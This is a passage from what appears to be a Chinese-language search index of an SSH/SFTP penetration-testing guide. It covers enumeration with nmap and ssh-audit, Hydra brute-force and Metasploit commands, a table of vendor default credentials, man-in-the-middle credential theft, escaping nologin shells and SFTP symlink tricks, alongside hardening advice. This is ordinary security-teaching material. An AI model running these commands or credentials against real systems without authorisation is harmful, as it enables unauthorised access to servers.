\u670d\u52a1\u5668\uff0c\u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u6b64\u96a7\u9053\u4f20\u8f93\u60a8\u7684\u6d41\u91cf\uff0c\u4f8b\u5982\u4f7f\u7528\u516c\u5171\u7aef\u53e3\u8f6c\u53d1\uff1a sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised> SFTP \u7b26\u53f7\u94fe\u63a5 sftp \u6709\u547d\u4ee4\u201c\u7b26\u53f7 \u94fe\u63a5 \u201d\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60a8\u5728\u67d0\u4e2a\u6587\u4ef6\u5939\u4e2d\u5177\u6709 \u53ef\u5199\u6743\u9650 \uff0c\u5219\u53ef\u4ee5\u521b\u5efa \u5176\u4ed6\u6587\u4ef6\u5939/\u6587\u4ef6 \u7684 \u7b26\u53f7\u94fe\u63a5 \u3002\u7531\u4e8e\u60a8\u53ef\u80fd \u88ab\u56f0 \u5728 chroot \u4e2d\uff0c\u8fd9\u5bf9\u60a8 \u6765\u8bf4\u4e0d\u662f\u7279\u522b\u6709\u7528 \uff0c\u4f46\u662f\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u4ece \u975e chroot \u670d\u52a1 \u8bbf\u95ee \u521b\u5efa\u7684 \u7b26\u53f7\u94fe\u63a5 \uff08\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u4ece Web \u8bbf\u95ee\u7b26\u53f7\u94fe\u63a5\uff09\uff0c\u60a8\u53ef\u4ee5 \u901a\u8fc7\u7f51\u7edc\u6253\u5f00\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6 \u3002 \u4f8b\u5982\uff0c\u8981\u521b\u5efa\u4ece\u65b0\u6587\u4ef6 \u201c froot* * \u201d\u5230\u201c /* \u201d\u7684 *\u7b26\u53f7\u94fe\u63a5 \uff1a sftp> symlink / froot \u5982\u679c\u60a8\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u6587\u4ef6\u201c froot \u201d\uff0c\u60a8\u5c06\u80fd\u591f\u5217\u51fa\u7cfb\u7edf\u7684\u6839\uff08\u201c/\u201d\uff09\u6587\u4ef6\u5939\u3002 \u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5 \u5728\u9ad8\u5b89\u5168\u6027\u73af\u5883\u4e2d\uff0c\u901a\u5e38\u7684\u505a\u6cd5\u662f\u4ec5\u542f\u7528\u57fa\u4e8e\u5bc6\u94a5\u6216\u53cc\u56e0\u7d20\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u7b80\u5355\u56e0\u7d20\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002\u4f46\u901a\u5e38\u4f1a\u542f\u7528\u66f4\u5f3a\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u800c\u4e0d\u4f1a\u7981\u7528\u8f83\u5f31\u7684\u65b9\u6cd5\u3002\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u542f\u7528 publickey openSSH \u914d\u7f6e\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u65b9\u6cd5\u4f46\u4e0d\u7981\u7528 password \u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u4f7f\u7528 SSH \u5ba2\u6237\u7aef\u7684\u8be6\u7ec6\u6a21\u5f0f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u770b\u5230\u542f\u7528\u4e86\u4e00\u4e2a\u8f83\u5f31\u7684\u65b9\u6cd5\uff1a $ ssh -v 192.168.1.94 OpenSSH_8.1p1, OpenSSL 1.1.1d 10 Sep 2019 ... debug1: Authentications that can continue: publickey,password,keyboard-interactive \u4f8b\u5982\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u9650\u5236\u5e76\u4e14\u60a8\u6c38\u8fdc\u6ca1\u6709\u673a\u4f1a\u8bbf\u95ee\u5bc6\u7801\u65b9\u6cd5\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5 PreferredAuthentications \u9009\u9879\u5f3a\u5236\u4f7f\u7528\u6b64\u65b9\u6cd5\u3002 $ ssh -v 192.168.1.94 -o PreferredAuthentications=password ... debug1: Next authentication method: password \u68c0\u67e5 SSH \u670d\u52a1\u5668\u914d\u7f6e\u662f\u5fc5\u8981\u7684\uff0c\u4ee5\u68c0\u67e5\u662f\u5426\u53ea\u6388\u6743\u4e86\u9884\u671f\u7684\u65b9\u6cd5\u3002\u5728\u5ba2\u6237\u7aef\u4f7f\u7528\u8be6\u7ec6\u6a21\u5f0f\u53ef\u4ee5\u5e2e\u52a9\u67e5\u770b \u914d\u7f6e\u7684\u6709\u6548\u6027\u3002 \u914d\u7f6e\u6587\u4ef6 ssh_config sshd_config authorized_keys ssh_known_hosts known_hosts id_rsa Fuzzing https://packetstormsecurity.com/files/download/71252/sshfuzz.txt https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2 \u53c2\u8003 You can find interesting guides on how to harden SSH in https://www.ssh-audit.com/hardening_guides.html https://community.turgensec.com/ssh-hacking-guide \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: SSH Port_Number: 22 Protocol_Description: Secure Shell Hardening Entry_1: Name: Hydra Brute Force Description: Need Username Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 -u {IP} ssh Entry_2: Name: consolesless mfs enumeration Description: SSH enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'","title":"22 - SSH/SFTP\u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"SSH \u6216 Secure Shell \u6216 Secure Socket Shell \u662f\u4e00\u79cd\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u4e3a\u7528\u6237\u63d0\u4f9b \u4e86\u4e00\u79cd\u901a\u8fc7\u4e0d\u5b89\u5168\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u7684\u5b89\u5168\u65b9\u5f0f\u3002 \u9ed8\u8ba4\u7aef\u53e3: 22 22/tcp open ssh syn-ack SSH \u670d\u52a1: openSSH \u2013 OpenBSD SSH\uff0c\u4ece Windows 10 \u5f00\u59cb\u5728 BSD\u3001Linux \u53d1\u884c\u7248\u548c Windows \u4e2d\u63d0\u4f9b Dropbear \u2013 \u7528\u4e8e\u4f4e\u5185\u5b58\u548c\u5904\u7406\u5668\u8d44\u6e90\u73af\u5883\u7684 SSH \u5b9e\u73b0\uff0c\u5728 OpenWrt \u4e2d\u63d0\u4f9b PuTTY \u2013 Windows \u7684 SSH \u5b9e\u73b0\uff0c\u5ba2\u6237\u7aef\u5e38\u7528\uff0c\u670d\u52a1\u5668\u7aef\u4f7f\u7528\u8f83\u5c11 CopSSH \u2013 Windows \u7684 OpenSSH \u5b9e\u65bd SSH \u5e93\uff08\u5b9e\u73b0\u670d\u52a1\u5668\u7aef\uff09: libssh \u2013 \u591a\u5e73\u53f0 C \u5e93\uff0c\u5728 Python \u3001 Perl \u548c R \u4e2d\u5b9e\u73b0 SSHv2 \u534f\u8bae\u7ed1\u5b9a\uff1b\u5b83\u88ab KDE \u7528\u4e8e sftp\uff0cGitHub \u7528\u4e8e git SSH \u57fa\u7840\u8bbe\u65bd wolfSSH \u2013 \u7528 ANSI C \u7f16\u5199\u7684 SSHv2 \u670d\u52a1\u5668\u5e93\uff0c\u9762\u5411\u5d4c\u5165\u5f0f\u3001RTOS \u548c\u8d44\u6e90\u53d7\u9650\u73af\u5883 Apache MINA SSHD \u2013 Apache SSHD Java \u5e93\u57fa\u4e8e Apache MINA paramiko \u2013 Python SSHv2 \u534f\u8bae\u5e93","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#banner","text":"nc -vn <IP> 22","title":"Banner \u6293\u53d6"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#ssh","text":"ssh-audit \u662f\u4e00\u4e2a\u7528\u4e8e ssh \u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u914d\u7f6e\u5ba1\u8ba1\u7684\u5de5\u5177\u3002 https://github.com/jtesta/ssh-audit \u662f\u6765\u81ea https://github.com/arthepsy/ssh-audit/\u7684\u65b0\u5206\u652f \u7279\u5f81\uff1a SSH1\u548cSSH2\u534f\u8bae\u670d\u52a1\u5668\u652f\u6301\uff1b \u5206\u6790 SSH \u5ba2\u6237\u7aef\u914d\u7f6e\uff1b \u6293\u53d6\u6a2a\u5e45\uff0c\u8bc6\u522b\u8bbe\u5907\u6216\u8f6f\u4ef6\u548c\u64cd\u4f5c\u7cfb\u7edf\uff0c\u68c0\u6d4b\u538b\u7f29\uff1b \u6536\u96c6\u5bc6\u94a5\u4ea4\u6362\u3001\u4e3b\u673a\u5bc6\u94a5\u3001\u52a0\u5bc6\u548c\u6d88\u606f\u8ba4\u8bc1\u4ee3\u7801\u7b97\u6cd5\uff1b \u8f93\u51fa\u7b97\u6cd5\u4fe1\u606f\uff08\u81ea\u53ef\u7528\u3001\u5220\u9664/\u7981\u7528\u3001\u4e0d\u5b89\u5168/\u5f31/\u9057\u7559\u7b49\uff09\uff1b \u8f93\u51fa\u7b97\u6cd5\u5efa\u8bae\uff08\u6839\u636e\u8bc6\u522b\u7684\u8f6f\u4ef6\u7248\u672c\u6dfb\u52a0\u6216\u5220\u9664\uff09\uff1b \u8f93\u51fa\u5b89\u5168\u4fe1\u606f\uff08\u76f8\u5173\u95ee\u9898\u3001\u5206\u914d\u7684 CVE \u5217\u8868\u7b49\uff09\uff1b \u6839\u636e\u7b97\u6cd5\u4fe1\u606f\u5206\u6790SSH\u7248\u672c\u517c\u5bb9\u6027\uff1b \u6765\u81ea OpenSSH\u3001Dropbear SSH \u548c libssh \u7684\u5386\u53f2\u4fe1\u606f\uff1b \u5728 Linux \u548c Windows \u4e0a\u8fd0\u884c\uff1b \u6ca1\u6709\u4f9d\u8d56 usage: ssh-audit.py [-1246pbcnjvlt] <host> -1, --ssh1 force ssh version 1 only -2, --ssh2 force ssh version 2 only -4, --ipv4 enable IPv4 (order of precedence) -6, --ipv6 enable IPv6 (order of precedence) -p, --port=<port> port to connect -b, --batch batch output -c, --client-audit starts a server on port 2222 to audit client software config (use -p to change port; use -t to change timeout) -n, --no-colors disable colors -j, --json JSON output -v, --verbose verbose output -l, --level=<level> minimum output level (info|warn|fail) -t, --timeout=<secs> timeout (in seconds) for connection and reading (default: 5) $ python3 ssh-audit <IP> See it in action (Asciinema)","title":"\u81ea\u52a8 ssh \u5ba1\u8ba1"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#ssh_1","text":"ssh-keyscan -t rsa <IP> -p <PORT>","title":"\u670d\u52a1\u5668\u7684\u516c\u5171 SSH \u5bc6\u94a5"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"This is discovered by default by nmap . But you can also use sslcan or sslyze .","title":"\u5f31\u5bc6\u7801\u7b97\u6cd5"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#nmap","text":"nmap -p22 <ip> -sC # \u4e3aSSH\u53d1\u9001\u9ed8\u8ba4\u7684nmap\u811a\u672c nmap -p22 <ip> -sV # \u68c0\u7d22\u7248\u672c nmap -p22 <ip> --script ssh2-enum-algos # \u68c0\u7d22\u652f\u6301\u7684\u7b97\u6cd5 nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # \u68c0\u7d22\u5f31\u5bc6\u94a5 nmap -p22 <ip> --script ssh-auth-methods --script-args=\"ssh.user=root\" # \u68c0\u67e5\u8ba4\u8bc1\u65b9\u5f0f","title":"Nmap \u811a\u672c"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan","text":"ssh","title":"Shodan"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"","title":"\u66b4\u529b\u7834\u89e3\u7528\u6237\u540d\u3001\u5bc6\u7801\u548c\u79c1\u94a5"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_5","text":"\u5728\u67d0\u4e9b\u7248\u672c\u7684 OpenSSH \u4e2d\uff0c\u60a8\u53ef\u4ee5\u8fdb\u884c\u5b9a\u65f6\u653b\u51fb\u6765\u679a\u4e3e\u7528\u6237\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528 metasploit \u6a21\u5757\u6765\u5229\u7528\u5b83\uff1a msf> use scanner/ssh/ssh_enumusers","title":"\u7528\u6237\u540d\u679a\u4e3e"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#bf","text":"\u5982\u679c\u60a8\u77e5\u9053\u4e00\u4e9b\u53ef\u4ee5\u4f7f\u7528\u7684 ssh \u79c1\u94a5...\u8ba9\u6211\u4eec\u8bd5\u8bd5\u5427\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528 nmap \u811a\u672c\uff1a https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html \u6216\u8005 MSF \u8f85\u52a9\u6a21\u5757\uff1a msf> use scanner/ssh/ssh_identify_pubkeys","title":"\u79c1\u94a5/\u516c\u94a5 BF"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#kerberos","text":"\u4f7f\u7528\u8be5\u534f\u8bae\u7684 crackmapexec ssh \u53ef\u4ee5\u4f7f\u7528\u8be5\u9009\u9879 \u901a\u8fc7 kerberos --kerberos \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u8bf7\u8fd0\u884c\u3002 crackmapexec ssh --help .","title":"Kerberos"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_6","text":"Vendor Usernames Passwords APC apc, device apc Brocade admin admin123, password, brocade, fibranne Cisco admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme Citrix root, nsroot, nsmaint, vdiadmin, kvm, cli, admin C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler D-Link admin, user private, admin, user Dell root, user1, admin, vkernel, cli calvin, 123456, password, vkernel, Stor@ge!, admin EMC admin, root, sysadmin EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc HP/3Com admin, root, vcx, app, spvar, manage, hpsupport, opc_op admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin Huawei admin, root 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123 IBM USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer Juniper netscreen netscreen NetApp admin netapp123 Oracle root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user changeme, ilom-admin, ilom-operator, welcome1, oracle VMware vi-admin, root, hqadmin, vmware, admin vmware, vmw@re, hqadmin, default","title":"\u9ed8\u8ba4\u51ed\u8bc1"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#ssh-","text":"\u5982\u679c\u60a8\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f5c\u4e3a\u53d7\u5bb3\u8005\u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fde\u63a5\u5230 SSH \u670d\u52a1\u5668\uff0c\u60a8\u53ef\u4ee5\u5c1d\u8bd5 \u6267\u884c MitM \u653b\u51fb\u4ee5\u7a83\u53d6\u8fd9\u4e9b\u51ed\u636e\uff1a \u653b\u51fb\u8def\u5f84\uff1a \u7528\u6237\u6d41\u91cf\u88ab\u91cd\u5b9a\u5411\u5230\u653b\u51fb\u673a\u5668 \u653b\u51fb\u8005\u76d1\u89c6\u8fde\u63a5\u5230 SSH \u670d\u52a1\u5668\u7684\u5c1d\u8bd5\u5e76\u5c06\u5b83\u4eec\u91cd\u5b9a\u5411\u5230\u5176 SSH \u670d\u52a1\u5668 \u653b\u51fb\u8005\u7684SSH\u670d\u52a1\u5668\u914d\u7f6e\uff0c\u9996\u5148\uff0c\u8bb0\u5f55\u6240\u6709\u8f93\u5165\u7684\u6570\u636e\uff0c\u5305\u62ec\u7528\u6237\u7684\u5bc6\u7801\uff0c\u5176\u6b21\uff0c\u5411\u7528\u6237\u60f3\u8981\u8fde\u63a5\u7684\u5408\u6cd5SSH\u670d\u52a1\u5668\u53d1\u9001\u547d\u4ee4\uff0c\u6267\u884c\u5b83\u4eec\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5408\u6cd5\u7528\u6237 * SSH MITM * \u5b8c\u5168\u6309\u7167\u4e0a\u9762\u63cf\u8ff0\u7684\u8fdb\u884c\u64cd\u4f5c\u3002 \u4e3a\u4e86\u6355\u83b7\u6267\u884c\u5b9e\u9645\u7684 MitM\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 ARP \u6b3a\u9a97\u3001DNS \u6b3a\u9a97\u6280\u672f\u3002","title":"SSH-\u4e2d\u95f4\u4eba"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_7","text":"","title":"\u914d\u7f6e\u9519\u8bef"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#root","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5927\u591a\u6570 SSH \u670d\u52a1\u5668\u5b9e\u73b0\u5c06\u5141\u8bb8 root \u767b\u5f55\uff0c\u5efa\u8bae\u7981\u7528\u5b83\uff0c\u56e0\u4e3a\u5982\u679c\u8be5\u5e10\u6237\u7684\u51ed\u636e\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u5c06\u76f4\u63a5\u83b7\u5f97\u7ba1\u7406\u6743\u9650\uff0c\u8fd9\u4e5f\u5c06\u5141\u8bb8\u653b\u51fb\u8005\u5bf9\u8be5\u5e10\u6237\u8fdb\u884c\u66b4\u529b\u653b\u51fb\u3002 \u5982\u4f55\u7981\u7528 openSSH \u7684 root \u767b\u5f55\uff1a \u7f16\u8f91 SSH \u670d\u52a1\u5668\u914d\u7f6e sudoedit /etc/ssh/sshd_config \u6362\u6210 #PermitRootLogin yes _ PermitRootLogin no \u8003\u8651\u66f4\u6539\u914d\u7f6e\uff1a sudo systemctl daemon-reload \u91cd\u65b0\u542f\u52a8 SSH \u670d\u52a1\u5668 sudo systemctl restart sshd","title":"Root \u767b\u5f55"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#sftp","text":"\u53e6\u4e00\u4e2a\u5e38\u89c1\u7684 SSH \u914d\u7f6e\u9519\u8bef\u7ecf\u5e38\u51fa\u73b0\u5728 SFTP \u914d\u7f6e\u4e2d\u3002\u5927\u591a\u6570\u65f6\u5019\uff0c\u5728\u521b\u5efa SFTP \u670d\u52a1\u5668\u65f6\uff0c\u7ba1\u7406\u5458\u5e0c\u671b\u7528\u6237\u5177\u6709 SFTP \u8bbf\u95ee\u6743\u9650\u6765\u5171\u4eab\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u5728\u673a\u5668\u4e0a\u83b7\u53d6\u8fdc\u7a0b shell\u3002\u6240\u4ee5\u4ed6\u4eec\u8ba4\u4e3a\u521b\u5efa\u4e00\u4e2a\u7528\u6237\uff0c\u7ed9\u4ed6\u4e00\u4e2a\u5360\u4f4d\u7b26 shell\uff08\u6bd4\u5982 /usr/bin/nologin \u6216 /usr/bin/false \uff09\u5e76\u5728\u76d1\u72f1\u4e2d chroot \u5c31\u8db3\u4ee5\u907f\u514d shell \u8bbf\u95ee\u6216\u5bf9\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u6ee5\u7528\u3002\u4f46\u4ed6\u4eec\u9519\u4e86\uff0c \u7528\u6237\u53ef\u4ee5\u5728\u6267\u884c\u9ed8\u8ba4\u547d\u4ee4\u6216 shell \u4e4b\u524d\u8981\u6c42\u5728\u8eab\u4efd\u9a8c\u8bc1\u540e\u7acb\u5373\u6267\u884c\u547d\u4ee4 \u3002\u56e0\u6b64\uff0c\u8981\u7ed5\u8fc7\u5c06\u62d2\u7edd shell \u8bbf\u95ee\u7684\u5360\u4f4d\u7b26 shell\uff0c\u53ea\u9700\u8981\u6c42\u6267\u884c\u547d\u4ee4\uff08\u4f8b\u5982 /bin/bash \uff09\u4e4b\u524d\uff0c\u53ea\u9700\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a $ ssh -v noraj@192.168.1.94 id ... Password: debug1: Authentication succeeded (keyboard-interactive). Authenticated to 192.168.1.94 ([192.168.1.94]:22). debug1: channel 0: new [client-session] debug1: Requesting no-more-sessions@openssh.com debug1: Entering interactive session. debug1: pledge: network debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0 debug1: Sending command: id debug1: client_input_channel_req: channel 0 rtype exit-status reply 0 debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0 uid=1000(noraj) gid=100(users) groups=100(users) debug1: channel 0: free: client-session, nchannels 1 Transferred: sent 2412, received 2480 bytes, in 0.1 seconds Bytes per second: sent 43133.4, received 44349.5 debug1: Exit status 0 $ ssh noraj@192.168.1.94 /bin/bash /etc/ssh/sshd_config \u4ee5\u4e0b\u662f\u7528\u6237\u7684\u5b89\u5168 SFTP \u914d\u7f6e ( \u2013openSSH)\u793a\u4f8b noraj \uff1a Match User noraj ChrootDirectory %h ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no PermitTTY no \u6b64\u914d\u7f6e\u5c06\u4ec5\u5141\u8bb8 SFTP\uff1a\u901a\u8fc7\u5f3a\u5236\u542f\u52a8\u547d\u4ee4\u548c\u7981\u7528 TTY \u8bbf\u95ee\u6765\u7981\u7528 shell \u8bbf\u95ee\uff0c\u4f46\u4e5f\u7981\u7528\u6240\u6709\u7c7b\u578b\u7684\u7aef\u53e3\u8f6c\u53d1\u6216\u96a7\u9053\u3002","title":"SFTP\u547d\u4ee4\u6267\u884c"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#sftp_1","text":"\u5982\u679c\u60a8\u6709\u6743\u8bbf\u95ee SFTP \u670d\u52a1\u5668\uff0c\u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u6b64\u96a7\u9053\u4f20\u8f93\u60a8\u7684\u6d41\u91cf\uff0c\u4f8b\u5982\u4f7f\u7528\u516c\u5171\u7aef\u53e3\u8f6c\u53d1\uff1a sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>","title":"SFTP \u96a7\u9053"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#sftp_2","text":"sftp \u6709\u547d\u4ee4\u201c\u7b26\u53f7 \u94fe\u63a5 \u201d\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60a8\u5728\u67d0\u4e2a\u6587\u4ef6\u5939\u4e2d\u5177\u6709 \u53ef\u5199\u6743\u9650 \uff0c\u5219\u53ef\u4ee5\u521b\u5efa \u5176\u4ed6\u6587\u4ef6\u5939/\u6587\u4ef6 \u7684 \u7b26\u53f7\u94fe\u63a5 \u3002\u7531\u4e8e\u60a8\u53ef\u80fd \u88ab\u56f0 \u5728 chroot \u4e2d\uff0c\u8fd9\u5bf9\u60a8 \u6765\u8bf4\u4e0d\u662f\u7279\u522b\u6709\u7528 \uff0c\u4f46\u662f\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u4ece \u975e chroot \u670d\u52a1 \u8bbf\u95ee \u521b\u5efa\u7684 \u7b26\u53f7\u94fe\u63a5 \uff08\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u4ece Web \u8bbf\u95ee\u7b26\u53f7\u94fe\u63a5\uff09\uff0c\u60a8\u53ef\u4ee5 \u901a\u8fc7\u7f51\u7edc\u6253\u5f00\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6 \u3002 \u4f8b\u5982\uff0c\u8981\u521b\u5efa\u4ece\u65b0\u6587\u4ef6 \u201c froot* * \u201d\u5230\u201c /* \u201d\u7684 *\u7b26\u53f7\u94fe\u63a5 \uff1a sftp> symlink / froot \u5982\u679c\u60a8\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u6587\u4ef6\u201c froot \u201d\uff0c\u60a8\u5c06\u80fd\u591f\u5217\u51fa\u7cfb\u7edf\u7684\u6839\uff08\u201c/\u201d\uff09\u6587\u4ef6\u5939\u3002","title":"SFTP \u7b26\u53f7\u94fe\u63a5"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_8","text":"\u5728\u9ad8\u5b89\u5168\u6027\u73af\u5883\u4e2d\uff0c\u901a\u5e38\u7684\u505a\u6cd5\u662f\u4ec5\u542f\u7528\u57fa\u4e8e\u5bc6\u94a5\u6216\u53cc\u56e0\u7d20\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u7b80\u5355\u56e0\u7d20\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002\u4f46\u901a\u5e38\u4f1a\u542f\u7528\u66f4\u5f3a\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\uff0c\u800c\u4e0d\u4f1a\u7981\u7528\u8f83\u5f31\u7684\u65b9\u6cd5\u3002\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u542f\u7528 publickey openSSH \u914d\u7f6e\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u65b9\u6cd5\u4f46\u4e0d\u7981\u7528 password \u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u4f7f\u7528 SSH \u5ba2\u6237\u7aef\u7684\u8be6\u7ec6\u6a21\u5f0f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u770b\u5230\u542f\u7528\u4e86\u4e00\u4e2a\u8f83\u5f31\u7684\u65b9\u6cd5\uff1a $ ssh -v 192.168.1.94 OpenSSH_8.1p1, OpenSSL 1.1.1d 10 Sep 2019 ... debug1: Authentications that can continue: publickey,password,keyboard-interactive \u4f8b\u5982\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u9650\u5236\u5e76\u4e14\u60a8\u6c38\u8fdc\u6ca1\u6709\u673a\u4f1a\u8bbf\u95ee\u5bc6\u7801\u65b9\u6cd5\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5 PreferredAuthentications \u9009\u9879\u5f3a\u5236\u4f7f\u7528\u6b64\u65b9\u6cd5\u3002 $ ssh -v 192.168.1.94 -o PreferredAuthentications=password ... debug1: Next authentication method: password \u68c0\u67e5 SSH \u670d\u52a1\u5668\u914d\u7f6e\u662f\u5fc5\u8981\u7684\uff0c\u4ee5\u68c0\u67e5\u662f\u5426\u53ea\u6388\u6743\u4e86\u9884\u671f\u7684\u65b9\u6cd5\u3002\u5728\u5ba2\u6237\u7aef\u4f7f\u7528\u8be6\u7ec6\u6a21\u5f0f\u53ef\u4ee5\u5e2e\u52a9\u67e5\u770b \u914d\u7f6e\u7684\u6709\u6548\u6027\u3002","title":"\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_9","text":"ssh_config sshd_config authorized_keys ssh_known_hosts known_hosts id_rsa","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#fuzzing","text":"https://packetstormsecurity.com/files/download/71252/sshfuzz.txt 